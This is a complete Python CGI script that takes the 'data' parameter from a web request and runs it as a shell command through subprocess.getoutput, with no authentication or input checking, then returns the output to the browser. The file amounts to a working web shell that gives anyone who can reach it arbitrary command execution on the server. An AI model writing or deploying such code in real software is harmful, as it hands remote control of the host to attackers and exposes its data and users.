#!/usr/bin/python3

import cgi
import subprocess 
import time

print("Content-type: text/html")
print()

#time.sleep(5)

fs = cgi.FieldStorage()
data = fs.getvalue('data')

out = subprocess.getoutput(data)
print(out)
